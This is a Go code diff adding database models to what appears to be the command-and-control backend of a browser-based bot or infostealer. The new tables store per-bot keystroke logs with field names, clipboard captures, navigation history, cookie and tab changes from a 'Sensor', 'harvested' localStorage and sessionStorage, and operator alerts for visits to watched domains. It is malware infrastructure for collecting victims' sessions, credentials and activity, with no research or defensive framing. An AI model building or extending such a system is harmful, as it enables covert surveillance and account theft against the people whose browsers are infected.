@@ -101,6 +101,7 @@ type BotKeyboardLog struct {
 	URL       string    `gorm:"type:text;column:url"`
 	Title     string    `gorm:"type:text;column:title"`
 	Keys      string    `gorm:"type:text;not null;column:keys"`
+	Field     string    `gorm:"type:text;column:field"`
 	Timestamp time.Time `gorm:"not null;index;column:timestamp"`
 }
 
@@ -118,6 +119,59 @@ type BotClipboardLog struct {
 }
 
 func (BotClipboardLog) TableName() string { return "bot_clipboard_logs" }
+
+// BotNavEvent is a persisted webNavigation / SPA history update.
+type BotNavEvent struct {
+	BaseUUID
+	BotID          uuid.UUID `gorm:"type:uuid;index;column:bot_id"`
+	URL            string    `gorm:"type:text;column:url"`
+	Title          string    `gorm:"type:text;column:title"`
+	TransitionType string    `gorm:"type:text;column:transition_type"`
+	TabID          int       `gorm:"column:tab_id"`
+	Timestamp      time.Time `gorm:"not null;index;column:timestamp"`
+}
+
+func (BotNavEvent) TableName() string { return "bot_nav_events" }
+
+// BotAlert is an operator-facing detection (currently domain visits).
+type BotAlert struct {
+	BaseUUID
+	BotID        uuid.UUID `gorm:"type:uuid;index;column:bot_id"`
+	Kind         string    `gorm:"type:text;index;column:kind"`
+	Severity     string    `gorm:"type:text;column:severity"`
+	Title        string    `gorm:"type:text;column:title"`
+	URL          string    `gorm:"type:text;column:url"`
+	Detail       string    `gorm:"type:text;column:detail"`
+	Timestamp    time.Time `gorm:"not null;index;column:timestamp"`
+	Acknowledged bool      `gorm:"not null;default:false;column:acknowledged"`
+}
+
+func (BotAlert) TableName() string { return "bot_alerts" }
+
+// BotDeltaEvent is an append-only cookie or tab change from the Sensor.
+type BotDeltaEvent struct {
+	BaseUUID
+	BotID     uuid.UUID `gorm:"type:uuid;index;column:bot_id"`
+	Kind      string    `gorm:"type:text;index;column:kind"`
+	Action    string    `gorm:"type:text;column:action"`
+	URL       string    `gorm:"type:text;column:url"`
+	Title     string    `gorm:"type:text;column:title"`
+	Detail    string    `gorm:"type:text;column:detail"`
+	Payload   JSONMap   `gorm:"type:jsonb;column:payload"`
+	Timestamp time.Time `gorm:"not null;index;column:timestamp"`
+}
+
+func (BotDeltaEvent) TableName() string { return "bot_delta_events" }
+
+// BotPageStorage is the latest harvested origin localStorage/sessionStorage.
+type BotPageStorage struct {
+	BaseUUID
+	BotID      uuid.UUID `gorm:"type:uuid;uniqueIndex;column:bot_id"`
+	Origins    JSONArray `gorm:"type:jsonb;column:origins"`
+	CapturedAt time.Time `gorm:"not null;column:captured_at"`
+}
+
+func (BotPageStorage) TableName() string { return "bot_page_storage" }
 
 // Setting mirrors Sequelize Settings table.
 type Setting struct {
@@ -137,6 +191,10 @@ func All() []any {
 		&BotScreenshot{},
 		&BotKeyboardLog{},
 		&BotClipboardLog{},
+		&BotNavEvent{},
+		&BotAlert{},
+		&BotDeltaEvent{},
+		&BotPageStorage{},
 		&BotBrowserSnapshot{},
 		&BotBrowserSnapshotState{},
 		&Setting{},
